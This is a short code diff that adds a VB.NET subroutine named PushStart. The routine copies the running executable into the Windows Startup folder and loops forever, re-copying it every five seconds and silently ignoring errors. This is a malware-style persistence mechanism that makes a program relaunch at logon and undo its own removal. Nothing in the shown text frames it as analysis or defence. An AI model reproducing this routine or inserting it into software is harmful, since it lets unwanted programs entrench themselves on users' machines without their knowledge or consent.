@@ -1,0 +1,12 @@
+Shared Sub PushStart()
+        Dim xx As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
+        While True
+            Try
+                If Not IO.File.Exists(xx) Then
+                    IO.File.Copy(System.Windows.Forms.Application.ExecutablePath, xx)
+                End If
+            Catch
+            End Try
+            System.Threading.Thread.Sleep(5000)
+        End While
+End Sub
